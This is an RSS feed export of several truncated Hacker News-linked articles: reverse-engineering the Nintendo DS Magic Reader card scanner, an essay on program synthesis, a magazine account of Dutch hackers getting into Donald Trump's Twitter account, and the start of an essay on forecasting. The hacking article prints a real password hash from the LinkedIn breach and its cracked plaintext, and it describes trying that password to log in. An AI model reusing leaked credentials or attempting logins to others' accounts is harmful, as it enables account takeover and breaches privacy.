			<!-- Main Page Inner Box -->
			<div>

				<p>Edge of Emulation: Magic Reader</p>
				<p>. . . . . . . . . . .</p>

				<p><img src="https://shonumi.github.io/articles/mr_1.png" alt=""></p>

				<p><strong>Beast Mode</strong></p>

				<p>Earlier this year, I went into a bit of a frenzy buying all kinds of NDS hardware to research. With GBE+ finally running more and more games, I anticipated working on many of the Slot-2 accessories for the system. I purchased more items than I had time to examine, so I ended up with quite a backlog. However, due to the COVID-19 pandemic, getting things from Japan to the United States is now rather expensive. In hindsight, it was very fortunate that I went shopping back then. The virus has seriously disrupted international shipping and has directly affected my efforts to document various games and products. Of particular note, I'm still waiting on a very interesting piece to come out of Europe. In the meantime, this is the perfect opportunity to really dive into some stuff that's been sitting on my shelves for a while now.</p>

				<p>In 2007, Konami launched a special add-on for the Nintendo DS called the "Magic Reader". It came bundled with the game Juushinden: Ultimate Beast Battlers. The title features card-based duels using monsters, very similar to the Pokemon TCG or Yu-Gi-Oh games. Unique to Juushinden, however, is the ability to scan real, physical cards into the game via the Magic Reader. By simply tapping the card against the device, the software registers it, thereby allowing players to use the digital version. Unlike other card-reading hardware such as the e-Reader, or HCV-1000, the Magic Reader does not use any sort of swiping mechanism. In fact, Juushinden's cards don't appear to have any visible barcodes or dotcodes. Perhaps it really is magic?</p>

				<p>Juushinden and its Magic Reader were never released outside of Japan. While trading-card games are quite popular in that country, overseas is a different market. Ultimately, the video game and the scanner were one-off, having small and limited impact. Konami's attempt at something new remains a bit of a curiosity in that light. Even though the Magic Reader wasn't wildly successful, there's still a fair bit of knowledge we can gleen from the product. At the very least it's an interesting technical demonstration of how card-game-to-video-game interfaces could have evolved, and that much is worth preserving. Just as well, Juushinden was completely unplayable on any NDS emulator without support for the Magic Reader. Once again, we've got to ensure that such history isn't lost.</p>

				<p><strong>Card Collecting</strong></p>

				<p>Obtaining a Complete-in-Box copy of Juushinden pre-pandemic was relatively straightforward. On places like Yahoo Auctions Japan, it's pretty cheap, generally costing about 900 yen. Like other NDS games with extra hardware, Juushinden comes in a large cardboard box. While the packaging for titles like Mag Kid or Oshare Majo are all the same dimensions, Juushinden's is notably bigger. Inside, players will find the NDS game, the Magic Reader, a deck of 40 cards used as a "Starter Pack" and a folded, semi-glossy playing mat for the card game. None of the contents actually takes up a lot of space, so perhaps the size is just for attracting potential buyers.</p>

				<p><img src="https://shonumi.github.io/articles/mr_2.png" alt="The game"> <img src="https://shonumi.github.io/articles/mr_3.png" alt="Magic Reader"> <img src="https://shonumi.github.io/articles/mr_4.png" alt="Play mat"></p>
				<p>What you'll find inside every complete copy of Juushinden: Ultimate Beast Battlers.</p>

				<p>The Magic Reader itself is a dark gray device that sticks out of the GBA slot. By default, it's designed with the NDS Lite in mind, but it has a removable bit of plastic to better fit the original DS. It has a large bulb at the end where players are supposed to place the card to be read. Other than that, it has a white sticker on the back about the same size as a standard GBA cart label. Internally, the Magic Reader has a bunch of colored cables running to some components, two LEDs and a CCD module.</p>

				<p><img src="https://shonumi.github.io/articles/mr_5.png" alt="PCB shot 1"> <img src="https://shonumi.github.io/articles/mr_6.png" alt="PCB shot 2"></p>
				<p>The innards of the Magic Reader are crowded but colorful.</p>

				<p>When trying to play Juushinden via emulation, the game will immediately complain about not detecting the Magic Reader. Players can't reach the title screen or even see the company logos fade in or out. Without the hardware, the software shuts players out almost instantly. During the initial boot process, Juushinden merely wants to see whether or not the Magic Reader is inserted. This is the "device detection" phase common for many games that use Slot-2 add-ons. The process involves reading values from addresses reserved for the GBA cart. Slot-2 accessories will return special values instead of real ROM data, which is then used for identification. The ID used for the Magic Reader is very simple and summed up in the following psuedo-code:</p>

				<p><code>IF ADDRESS AND 1 THEN:                               </code></p>
				<p><code>    RETURN 0xFB                                      </code></p>
				<p><code>ELSE:                                                </code></p>
				<p><code>    RETURN 0xFF                                      </code></p>

				<p>Emulating that much allows Juushinden to run, granting access to the game's main menu and story mode. From there, things proceed normally until the tutorial asks players to start scanning cards. At this point, the next step to truly reverse-engineering the Magic Reader is to gather data by logging all reads and writes related to it. Input/output registers for many Slot-2 devices are typically located somewhere within the <code>0xA000000::0xAFFFFFF</code> address range. True enough, the logs revealed that the Magic Reader exclusively uses <code>0xA000000</code>. I named this register Magic Reader Control or "MR_CNT" for easier reference. With the read/write data captured, I tried to analyze how the Magic Reader operated. However, it became immediately clear I had no idea what was going on.</p>

				<p><code>READ MR_CNT         </code></p>
				<p><code>WRITE TO MR_CNT 0x42</code></p>
				<p><code>READ MR_CNT         </code></p>
				<p><code>WRITE TO MR_CNT 0x03</code></p>
				<p><code>WRITE TO MR_CNT 0x02</code></p>
				<p><code>WRITE TO MR_CNT 0x02</code></p>
				<p><code>READ MR_CNT         </code></p>
				<p><code>WRITE TO MR_CNT 0x02</code></p>
				<p><code>READ MR_CNT         </code></p>
				<p><code>WRITE TO MR_CNT 0x00</code></p>
				<p><code>WRITE TO MR_CNT 0x03</code></p>
				<p><code>WRITE TO MR_CNT 0x02</code></p>
				<p><code>WRITE TO MR_CNT 0x01</code></p>
				<p><code>WRITE TO MR_CNT 0x00</code></p>
				<p><code>WRITE TO MR_CNT 0x01</code></p>
				<p><code>WRITE TO MR_CNT 0x00</code></p>
				<p><code>...                 </code></p>

				<p>It was obvious that the value <code>0x42</code> was something special, appearing at the very start and nowhere else. The rest of the writes were just 0s, 1s, 2s, and 3s in different combinations. A bunch of reads were scattered here and there. Just staring at the raw numbers didn't help a lot, as there really wasn't any sort of context to examine. I was able to guess that however the NDS communicated with the Magic Reader, it mostly only used Bits 0 and 1 of the MR_CNT register. Beyond that much, I couldn't make out what exactly was happening. I strongly suspected that the NDS was trying to initialize the Magic Reader somehow, as most of the data logged came right after booting Juushinden.</p>

				<p>After peeking at the bytes transfered to and from the device, I decided to search for any relavant datasheets for the Magic Reader. One of the parts inside was labeled as a Sonix SN9P701FG-005. Thankfully there was a nice, detailed PDF available from Sonix themselves. Unfortunately, even with that documentation in hand, I couldn't quite make sense of how it applied to the NDS. The datasheet described a serial interface for sending commands or receiving data from an image processor, but it didn't mention anything about accessing that through a memory-mapped register like MR_CNT. MR_CNT was very likely the method by which the NDS used the SN9P701FG's serial interface, but how?</p>

				<p>To answer that question, I browsed through some of Juushinden's code while it made those reads and writes. Whenever the game read MR_CNT, it only ever checked a single bit. Depending on whether Bit 1 was a "0" or a "1" at certain points, the Magic Reader initialization code seemed to hang or timeout. At the time, I didn't really know what I was doing, but it seemed like a good idea to have GBE+ temporarily fake some responses when reading MR_CNT to allow the game to think the Magic Reader was working. During the card-scanning sequence in the tutorial, reads and writes to the Magic Reader changed as well according to Bit 1 of MR_CNT, and fiddling with those responses lead to a rather interesting bit of programming.</p>

				<p>Juushinden constantly pinged MR_CNT waiting for Bit 1 to become zero. Once that happened, it read from MR_CNT 23 times, constructing a 23-bit number by using the current value of Bit 1. It appeared that Bit 1 of MR_CNT was supposed to go low to signal to the NDS that the Magic Reader will send 23-bits of data. The transfer used one bit at a time, therefore it was likely using the serial interface mentioned in the datasheets. Investigating more game code, I saw this 23-bit number was later compared to several constant values such as <code>0x60FFF8</code>, <code>0x60FFF7</code>, and <code>0x60FFF1</code>. These constants were described in Sonix's PDF as commands from the SN9P701FG to the NDS. Uncovering this information proved a major breakthrough in reverse-engineering the Magic Reader.</p>

				<p>Juushinden's game code was looking for the <code>OIDCmd_PowerOn</code>, <code>OIDCmd_PowerDown</code>, or <code>OIDCmd_SystemReset</code> commands. The Magic Reader responds with that data when the NDS attempts to read the status of the SN9P701FG. The PDF explained how the two-wire interface works during read cycles, so I began to figure out how the NDS used MR_CNT. The first line, SCK (or Serial Clock), drives the serial communications. It's quite analogous to a pumping heart or a piston. SCK needs to continually transition from a HIGH state (1) to a LOW state (0) in order to transfer a bit. The second line, SDIO (or Serial Data In/Out) is the data bit to send or receive depending on the operation.</p>

				<p><img src="https://shonumi.github.io/articles/mr_7.png" alt="Diagram of SCK and SDIO"></p>
				<p>A diagram from the PDF illustrating SCK and SDIO</p>

				<p>Looking at the logs of all MR_CNT writes, I noticed that Bit 0 of that register always moved between HIGH and LOW states, therefore it was obviously SCK. Bit 1 or MR_CNT appeared to be SDIO, as its data was used to construct the 23-bit values returned from the Magic Reader. With this knowledge, I mapped all of the NDS' interactions with MR_CNT to ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://shonumi.github.io/articles/art23.html">https://shonumi.github.io/articles/art23.html</a></em></p>]]>
            </description>
            <link>https://shonumi.github.io/articles/art23.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24522898</guid>
            <pubDate>Fri, 18 Sep 2020 23:33:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why care about Program Synthesis]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24522698">thread link</a>) | @harporoeder
<br/>
September 18, 2020 | https://www.zinkov.com/posts/2019-02-17-why-program-synthesis/ | <a href="https://web.archive.org/web/*/https://www.zinkov.com/posts/2019-02-17-why-program-synthesis/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Program synthesis is now emerging as an exciting new area of research not just in the programming languages community, but also the machine learning community. In this post, I‚Äôd like to convince you why this area of study has the potential to solve precisely the kinds of problems existing approaches built around differential programming struggle with.</p>
<h2 id="basics-of-program-synthesis">Basics of Program Synthesis</h2>
<p>To start let‚Äôs informally and somewhat formally define what makes something a program synthesis problem. Informally, program synthesis is where given a some language <span>\(\mathcal{L}\)</span> and specification <span>\(\mathcal{S}\)</span> we return a program <span>\(\mathcal{P} \in \mathcal{L}\)</span> which meets that specification.</p>
<p>So what languages (<span>\(\mathcal{L}\)</span>) will we use? In principle, any language can be used. So we can synthesize Python code. In practice, because it is difficult these days to create programs much longer than 20-30 lines of code, we concentrate on domain-specific languages (DSLs). DSLs are languages like SQL, Regexes, or OpenGL shaders. If we are willing to be a bit loose about what defines a language, this can include synthesizing a set of library calls like <a href="https://autopandas.io/">Autopandas</a>. All the matters is we can define a grammar that covers the space of programs we wish to consider.</p>
<pre>   &lt;regex&gt; ::= &lt;term&gt; '|' &lt;regex&gt;
            |  &lt;term&gt;

   &lt;term&gt; ::= { &lt;factor&gt; }

   &lt;factor&gt; ::= &lt;base&gt; { '*' }
             
   &lt;base&gt; ::= &lt;char&gt;
           |  '\' &lt;char&gt;
           |  '(' &lt;regex&gt; ')'  
</pre>
<p><strong>Regex grammar</strong></p>
<p><img src="https://www.zinkov.com/images/grammar_graphics.png"></p>
<p>What do we mean by a specification (<span>\(\mathcal{S}\)</span>)?</p>
<p>This can actually be a wide variety of things. <span>\(\mathcal{S}\)</span> can be in particular order one or more of the following:</p>
<ul>
<li>A formal specification of the problem including things like theorems that must be proved along with other formal verification steps.</li>
<li>A set of input/output examples</li>
<li>A set of unit tests and <a href="https://hypothesis.works/articles/what-is-property-based-testing/">property-based</a> tests</li>
<li>A natural language description of the problem</li>
<li>A set of execution traces of the desired program</li>
<li>A sketch of a program where we have a partial program and some blanks we would like to fill in</li>
<li>A correct but inefficient implementation of the desire program</li>
</ul>
<p>While not strictly necessary, we may also have some side information like:</p>
<ul>
<li>Similar but incorrect programs</li>
<li>A set of other programs in <span>\(\mathcal{L}\)</span></li>
</ul>
<p>If we restrict ourselves to a specification that consists of input/output examples and a language of pure functions we get something pretty similar to supervised machine learning. But because the specification can be much richer we actually tackle problems that are hard to pose in a way amendable to traditional machine learning algorithms.</p>
<h2 id="program-synthesis-is-good-for">Program synthesis is good for</h2>
<h3 id="introduction">Introduction</h3>
<p>Now while it is a nice generic formalism that isn‚Äôt very compelling if there aren‚Äôt problems that benefit from being posed that way. Deep Learning and other optimization methods can now be used to solve a diverse set of problems. What problems tend to easier to solve with program syntheis? As things stand today that main advantages of specifically wanting to generate a program have to do with <em>interpretability</em>, <em>generalisability</em>, <em>verification</em>, <em>combinatorial problems</em>, and <em>output needs to be a program</em>.</p>
<h3 id="interpretability">Interpretability</h3>
<p>Consider the task of automatically grading assignments. How would you go about doing this? You might treat this as a classification task where you find the errors. The challenge with this problem is there can be multiple valid solutions, and the fix for the assignment will depend on which solution you think the student was attempting.</p>
<p>Instead, we can synthesize the correct program but exploring the space of small edits that get us from the incorrect program to a correct program that satisfies an already written specification. These edits can then be presented to the student. This is precisely what the paper <a href="https://arxiv.org/abs/1204.1751">Automated Feedback Generation for Introductory Programming Assignments</a> does on a subset of the Python language, and the paper <a href="https://openreview.net/pdf?id=B1iZRFkwz">Towards Specification-Directed Program Repair</a> which does it for the robot manipulation DSL Karel.</p>
<p>If we didn‚Äôt treat this as a program we would have likely ended up with some character edits which as much less interpretable.</p>
<p>This can be seen more strikingly in <a href="https://arxiv.org/abs/1707.09627">Learning to Infer Graphics Programs from Hand-Drawn Images</a> where the program we learn in being a program better communicates the structure in the image.</p>
<p><img src="https://www.zinkov.com/images/infer_graphics.png"></p>
<h3 id="generalisability">Generalisability</h3>
<p>Many deep learning models struggle with generalisibility. They tend not to be very robust to small distribution differences between the training and the testing set as well as being prone to adversarial examples where small imperceptible changes to the input radically change the prediction.</p>
<p>But for many domains if we represent our function as a program it can be made more robust to perturbations of the input like that as can be seen in <a href="https://arxiv.org/abs/1707.09627">Learning to Infer Graphics Programs from Hand-Drawn Images</a></p>
<p>There are actually particular challenges that face the most popular machine learning models which give program synthesis approaches no problems. We know LSTM have trouble with copy and reverse functions as seen in the <a href="https://deepmind.com/blog/article/differentiable-neural-computers">Differentiable Neural computers</a> paper.</p>
<p>LSTM models have trouble generalising to test data longer than training data as can be seen in <a href="https://arxiv.org/abs/1904.11694">Neural Logic Machines</a></p>
<p>In contrast the papers <a href="https://arxiv.org/abs/1704.06611">Making Neural Programming Architectures Generalize via Recursion</a> and <a href="https://arxiv.org/abs/1706.01284">Towards Synthesizing Complex Programs from Input-Output Examples</a> show no issues with either of those tasks.</p>
<p><img src="https://www.zinkov.com/images/genres1.png"></p>
<h3 id="verification">Verification</h3>
<p>Another advantage comes from our output artifact from a program. Neural networks are difficult to formally verify and at present often require major restrictions be placed on the models. In contrast, with programs we can reuse existing infrastructure for verifying deterministic programs. We can thus verify these programs terminate or obey a formal spec. In some domains like robotics we can check if the program has controlability.</p>
<h3 id="problems-with-combinatorial-shape">Problems with combinatorial shape</h3>
<p>Problems that require dealing with graphs, trees, and permutations still remain fairly challenging for existing machine learning algorithms. Programs are a natural representation for manipulating combinatorial structures. <a href="https://arxiv.org/abs/1506.03134">Pointer networks</a>, <a href="https://arxiv.org/abs/1802.08665">Sinkhorn networks</a> along with work with Memory networks and Neural Turing Machines shows that at the moment it is difficult to learn a function that can handle anything beyond toy problems which themselves have trouble generalizing to larger domains.</p>
<h3 id="required-to-use-some-api-output-must-be-program">Required to use some api / output must be program</h3>
<p>And finally, sometimes for one reason or another you need an output that must satisfy some grammar. This might be learning to generate a phone number or a URL. We might have some API we need to conform like if we are trying to generate mobile software that needs to call out to Android or IOS primitives.</p>
<p>We could be using program synthesis for compiler optimization so we must generate a valid program as output. We could be learning to <a href="https://www.sri.inf.ethz.ch/publications/raychev2015predicting">deobfuscate code</a>. Or learning to generate code that would automatically <a href="https://security.ece.cmu.edu/aeg/aeg-current.pdf">hack a system</a>.</p>
<p>Any other approach will need to model the grammar to make output that is acceptable and at that point could also be argued is performing program synthesis.</p>
<h2 id="conclusions">Conclusions</h2>
<p>None of this is meant to say that these problems couldn‚Äôt be solved with other methods, but program synthesis has distinct advantages that enables them to solve them particularly well.</p>

</div></div>]]>
            </description>
            <link>https://www.zinkov.com/posts/2019-02-17-why-program-synthesis/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24522698</guid>
            <pubDate>Fri, 18 Sep 2020 23:03:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How three Dutch hackers gained access to Donald Trump‚Äôs Twitter account]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24522345">thread link</a>) | @arianvanp
<br/>
September 18, 2020 | https://www.vn.nl/hackers-twitter-trump-english/ | <a href="https://web.archive.org/web/*/https://www.vn.nl/hackers-twitter-trump-english/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>In 2016, three Dutch hackers &nbsp;got hold of Donald Trump‚Äôs Twitter password. It wasn‚Äôt the launch codes of a nuclear missile, but it came pretty close: one tweet could jeopardize world peace, or prevent Trump from becoming president. How does one handle this amount of responsibility?</p><section id="article-body" data-article-content-element="" data-article-uid="480201" data-restricted="false"><div data-article-content-target=""><p>On October 27, 2016 three middle-aged men were gathered in a room in Hotel Cathedral in the center of Ghent. All three typing away on a laptop.<br> ‚ÄúUh oh‚Äù, one of them said.</p><p>A Twitter login screen displayed the Twitter handle @realdonaldtrump alongside a few password dots. Twitter also asked for an email address verification. ‚ÄòDonaldtrump@trump.com‚Äô didn‚Äôt work, an error message appeared. And the login attempt failed. Remarkably, in a way that had not been foreseen. The email address was incorrect, the password however, matched!<br> ‚ÄúDid you use a VPN?‚Äù<br> ‚ÄúNo. I didn‚Äôt think the password would work‚Äù.</p><blockquote><p>Was this a cyber-attack on an American presidential candidate?</p></blockquote><p>All three of them realized what this meant. The login attempt had been made using the hotel‚Äôs Wi-Fi. The Twitter log files now showed that there had been an attempt to log in on the account, from their hotel, using Donald Trump‚Äôs legitimate password. And these logfiles would undoubtedly be transferred to the U.S. intelligence services.</p><p>It could be perceived as a cyber-attack on an American presidential candidate.</p><p>Something that could get them into trouble and ruin their reputation, something they could not afford to let happen.</p><h5>Grumpy old hackers</h5><p>I first met with Edwin, Mattijs and Victor in June, in Amsterdam-Noord. ‚ÄúUp the stairs, first door on the left‚Äù. I enter a James-Bond-like setting, a room with high windows and a view of the IJ river, a dock with a drilling tower and a Russian polar ship. The three men are sitting at a large conference table. On the table, a few bottles of Club-Mate, the hacker‚Äôs preferred beverage.</p><p>It is immediately noticeable that the three of them are close. They have some resemblance to members of a rock band. Victor the talkative guitarist, Mattijs the thoughtful bass player and Edwin the grumpy drummer, who occasionally intervenes when the conversation tends to stray. All three are members of the GGOH ‚Äì <em>The Guild of Grumpy Old Hackers</em>. Their <a href="http://ggoh.info/">website</a> displays an image with eight pirates and a bitcoin address. ‚ÄúNo one has ever transferred a single bitcoin to us, though‚Äù.</p><p>The GGOH has about ten members: ‚ÄòElite‚Äô older hackers. Everyone has their own specialism. They do things the police or the army won‚Äôt or can‚Äôt do. They carry information they can‚Äôt ever share. They have decent day time jobs. Large corporates hire Edwin and Mattijs to help them with their information security. Victor is employed by a government agency. At night, however ‚Äì they run ‚Äòprojects‚Äô. They love algorithms and the law, because where there are rules, mistakes happen. ‚ÄúLoopholes. Forgotten things.‚Äù says Edwin, ‚ÄúSuch as the fact that churches have access to the municipal personal records database. Somewhat weird. The kind of thing that will trigger us to start a church of our own.‚Äù</p><blockquote><p>‚ÄúYes, the three of us could immobilize the country. And so could you. By yourself.‚Äù</p></blockquote><p>They aim to locate these mistakes before criminals, spies and terrorists do. And while doing so, they come across the craziest things. Such as bridges that can be opened via the internet, telescopic traffic bollards that can rise from the pavement using a laptop and pension funds that can be accessed with very limited difficulty. They are very careful to not mention specific examples. Mainly because of signed confidentiality agreements with clients. But also to not give others any ideas. ‚ÄúYes, the three of us can immobilize the country‚Äù, says Mattijs, ‚Äúbut so can you, by yourself‚Äù.</p><p>In order to securely exchange information with colleagues working in information security, they attend hacker conferences such as BlackHat and DEF CON in Las Vegas, BruCON in Ghent and the Chaos Communication Congress in Leipzig, where I first heard about their story. ‚ÄúDutch hackers hacked Trump‚Äôs Twitter account just before the 2016 elections‚Äù, someone there said.</p><p>Within a small bubble of the hacker community it was known who they were. And after a few months of strong persistence, the grumpy hackers agreed to speak with me. I was allowed to write up this story, on the sole condition that I would only mention their first names.</p><h5>Digital treasure trove</h5><p>In October 2016, the grumpy hackers attended another hacker conference. One they never miss: BruCON, held in the Aula Academica in Ghent, a nineteenth-century neoclassical building with Corinthian columns and a small lecture hall in the shape of an arena.</p><p>‚ÄúWe normally sit center downstairs, a little towards the back‚Äù, says Victor, ‚ÄúWe do that mostly for me. I don‚Äôt like any hustle and bustle around me, and I also like to keep a little oversight. We listen to the talks and dig around on our machines a little bit in the meantime. But this time we were on the second floor, very high up. On very unpleasant wooden benches. And then there was a talk from someone I personally like very much, but the presentation contained incredibly annoying sheep sounds. Really. Every single slide: m√®√®h. So then Edwin said, ‚ÄòYo that stolen LinkedIn data file has now been made publicly available‚Äô. That‚Äôs pretty cool, let‚Äôs go check it out‚Äù.</p><p>And so, accompanied by sheep chatter, the grumpy old hackers left the auditorium to go take a look at the LinkedIn file.</p><p>Everyone in information security had heard about ‚Äòthat LinkedIn database‚Äô. A digital treasure trove with 120 million usernames and hashes of passwords (see insert below to this piece). The loot of a digital burglary in 2012. The mastermind was Yevgeni Nikulin. Google his name and you will find his picture near a Lamborghini parked in front of the Basilius Cathedral on the Red Square in Moscow.</p><p>According to the lawsuit documentation now pending against him in the United States, he managed to get LinkedIn employees to click a link in an email and infected their computers with malware. Through these computers Nikulin managed to gain access to the internal LinkedIn network.</p><h5>Dark market</h5><p>Nikulin made a ton of money selling information to people in a secret criminal network. It is no coincidence that shortly after the LinkedIn break-in, Donald Trump‚Äôs Twitter account was hacked. On 21 February 2013, song lyrics by rapper Lil‚Äô Wayne appeared on Trump‚Äôs Twitter account. Trump, who had ‚Äòonly‚Äô two million followers at the time, reacted immediately:</p><p>‚ÄòMy Twitter has been seriously hacked ‚Äì and we are looking for the perpetrators‚Äô.</p><p>It wasn‚Äôt until the summer of 2016 that the LinkedIn file popped up on the black market. For 5 bitcoins ‚Äì at that time the equivalent of about three thousand euros ‚Äì it was offered on The RealDeal, a well-known dark market. This seemed very appealing to the grumpy old hackers.</p><p>‚ÄúWhen you are responsible for the information security of a large company or a government agency, you will want access to such a database to see if it contains data of people from your own organization. Three thousand euros isn‚Äôt much for a database like this. If you only knew how many intelligence services would be willing to pay for this‚Äù, says Victor. ‚ÄúHowever, buying stolen data is a criminal offense. It is illegal, and we wouldn‚Äôt ever consider doing that. We‚Äôre not keen on financially aiding criminals. Also, the police access the dark markets too. They can identify buyers. It was absolutely out of the question for us to acquire that file‚Äù.</p><blockquote><p>Mark Rutte was on that list. So was Mark Zuckerberg.</p></blockquote><p>Security researchers who infiltrated criminal networks got their hands on the database, regardless. Within the information security community, these types of files are shared in order to better test one‚Äôs own security. Something that is impossible to do out in the open.</p><p>Edwin was the first to receive a link, which he immediately shared with Mattijs and Victor. They quickly left for the hotel to quietly conduct further research.</p><p>‚ÄúI instantly found my director‚Äôs password in there‚Äù, says Victor, ‚ÄúI sent him a brief message, saying ‚Äòlook, it‚Äôs your password‚Äù. Dutch Prime Minister Mark Rutte was on the list. And so was Mark Zuckerberg (‚Äòdadada‚Äô ‚Äì turned out afterwards that the password for his facebook account was ‚Äòtadada‚Äô).</p><h5>‚ÄòEthical hackers‚Äô</h5><p>A week and a half prior to the US elections, everyone in the information security domain was talking about Trump‚Äôs Twitter account. It was the most wanted target in the world. From hacktivists to foreign intelligence agencies, they were all out for that account. It was therefore very instinctive to check if Donald Trump was also in the database.</p><p>And he was, right there.<br> email: donaldtrump@trump.com<br> password hash: 07b8938319c267dcdb501665220204bbde87bf1d</p><p>Using the program John the Ripper ‚Äì a tool hackers use to crack hashes ‚Äì Mattijs identified the password in less than a second: yourefired</p><p>Edwin was typing it in before anyone could say anything.<br> The password was accepted, and as an extra verification step an email address had to be entered.<br> But the entered address was incorrect.</p><p>Edwin almost fell off his chair. It meant that Trump hadn‚Äôt changed his password after the 2013 ‚Äòhack‚Äô.<br> Which was bad news.</p><blockquote><p>There was no time to waste. If anyone else would now hack Donald Trump‚Äôs Twitter account, they were the ones to be potentially blamed.</p></blockquote><p>The grumpy old hackers knew better than anyone that the Twitter administrators would be able to see that they had made a login attempt from their hotel with the correct Donald Trump password. And also that this information would sooner or later be passed on to the U.S. intelligence services. A login attempt on Donald Trump‚Äôs Twitter account could be perceived as a cyber-attack on a U.S. presidential candidate.</p><p>So there really was only one option. The grumpy hackers would have to prove that they were real ‚Äòethical hackers‚Äô. In order to demonstrate this in an unambiguous way, however ‚Äì they would have to, ironically, break into Trump‚Äôs account. It would be the ‚Ä¶</p></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.vn.nl/hackers-twitter-trump-english/">https://www.vn.nl/hackers-twitter-trump-english/</a></em></p>]]>
            </description>
            <link>https://www.vn.nl/hackers-twitter-trump-english/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24522345</guid>
            <pubDate>Fri, 18 Sep 2020 22:06:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Forecasting Fallacy]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24522322">thread link</a>) | @behoove
<br/>
September 18, 2020 | https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy | <a href="https://web.archive.org/web/*/https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-layout-label="Post Body" data-type="item" data-updated-on="1600438936254" id="item-5f5f85f0973bac65ca48c1f9"><div><div><div data-block-type="2" id="block-4be18d915b0dc68a6cc9"><div><h3>Introduction</h3><p>Marketers are prone to a prediction.</p><p>You‚Äôll find them in the annual tirade of trend decks. In the PowerPoint projections of self-proclaimed prophets. In the feeds of forecasters and futurists.&nbsp;They crop up on every conference stage. They make their mark on every marketing magazine. And they work their way into every white paper.</p><p>To understand the extent of our forecasting fascination, I analysed the websites of three management consultancies looking for predictions with time frames ranging from 2025 to 2050. Whilst one prediction may be published multiple times, the size of the numbers still shocked me.&nbsp;Deloitte‚Äôs site makes 6904&nbsp;predictions.&nbsp;McKinsey &amp; Company make 4296. And Boston Consulting Group, 3679.</p><p>In total, these three&nbsp;companies‚Äô websites include just shy of 15,000 predictions stretching out over the next 30 years.</p><p>But it doesn‚Äôt stop there.</p><p>My analysis finished in the year 2050 not because the predictions came to an end but because my enthusiasm did.</p><p>Search the sites and you‚Äôll find forecasts stretching all the way to the year 2100. We‚Äôre still finding our feet in this century but some, it seems, already understand the next.</p><p>I believe the vast majority of these to be not forecasts but fantasies. Snake oil dressed up as science. Fiction masquerading as fact.</p><p>This article assesses how predictions have performed in five fields. It argues that poor projections have propagated throughout our society and proliferated throughout our industry. It argues that our fixation with forecasts is fundamentally flawed.</p><p>So instead of focussing on the future, let‚Äôs take a moment to look at the predictions of the past.&nbsp;Let‚Äôs see how our projections panned out.</p><h3>We can‚Äôt predict recessions</h3><p>The Economist‚Äôs ‚ÄúThe World in 2020‚Äù, published in late 2019, brings together experts from business, politics and science to fill 150 pages with projections for the year ahead.</p><p>Editor Daniel Franklin&nbsp;<a href="https://theworldin.economist.com/edition/2020/article/17308/world-2020"><span>summarised</span></a>&nbsp;the issue‚Äôs predictions on 2020‚Äôs economic outlook:&nbsp;</p><blockquote><p>‚ÄúBanks, especially in Europe, will battle with negative interest rates. America will flirt with recession‚Äîbut don‚Äôt be surprised if disaster fails to strike, and markets revive.‚Äù</p></blockquote><p>Just over two months later COVID-19 struck, the world went into lockdown and we fell into one of the largest&nbsp;<a href="https://news.sky.com/story/coronavirus-largest-uk-recession-on-record-official-figures-12047521"><span>recessions</span></a>&nbsp;on record.</p><p>Perhaps this critique is unfair. The Economist wasn‚Äôt to know that we were on the precipice of a pandemic.&nbsp;So let‚Äôs review our success rate during more stable times.</p><p>Over to the&nbsp;<a href="https://www.ft.com/content/70a2a978-adac-11e7-8076-0a4bdda92ca2"><span>Financial Times</span></a>:</p><blockquote><p>&nbsp;‚ÄúIn the 2001 issue of the International Journal of Forecasting, an economist from the International Monetary Fund, Prakash Loungani, published a survey of the accuracy of economic forecasts throughout the 1990s. He reached two conclusions. The first was that forecasts are all much the same. There was little to choose between those produced by the IMF and the World Bank, and those from private sector forecasters. The second conclusion was that the predictive record of economists was terrible. Loungani wrote: ‚ÄúThe record of failure to predict recessions is virtually unblemished.‚Äù‚Äù</p></blockquote><p>It‚Äôs hard to overstate the severity of Loungani‚Äôs findings. His&nbsp;<a href="https://www.theguardian.com/money/2017/sep/02/economic-forecasting-flawed-science-data"><span>analysis</span></a>&nbsp;revealed that economists had failed to predict 148 of the past 150 recessions. To put it another way, the experts only saw 1.33% of recessions coming.</p><p>Others have pushed their analysis even further.</p><p>Andrew Brigden, Chief Economist at Fathom Consulting,&nbsp;<a href="https://www.bloomberg.com/news/articles/2019-03-28/economists-are-actually-terrible-at-forecasting-recessions"><span>analysed</span></a>&nbsp;the International Monetary Fund‚Äôs predictions across 30 years and 194 countries. The research found that only 4 of the 469 downturns had been predicted by the spring of the preceding year. Brigden‚Äôs success rate of 0.85% is remarkably consistent with Longani‚Äôs.&nbsp;<a href="https://www.fathom-consulting.com/the-economist-who-cried-wolf/"><span>Brigden</span></a>&nbsp;writes:</p><blockquote><p>‚ÄúSince 1988, the IMF has never forecast a developed economy recession with a lead of anything more than a few months.‚Äù</p></blockquote><p>These two studies, and countless others, paint a pretty damning picture of our ability to spot recessions on the horizon.&nbsp;</p><p>It‚Äôs clear that our&nbsp;track record of predicting&nbsp;recessions is pretty patchy. But that doesn‚Äôt stop us from making more. As a slowdown turns into a downturn, economists rush to reassure by predicting when more stable times will return. But how do they fare?&nbsp;</p><p>That‚Äôs the field that we‚Äôll focus on next.</p><h3>We can‚Äôt predict GDP</h3><p>On 15&nbsp;September 2008 Lehman Brothers filed for bankruptcy.</p><p>Despite being the largest bankruptcy filing in U.S.&nbsp;history, the&nbsp;government refused to bail out the bank. Global financial stress quickly 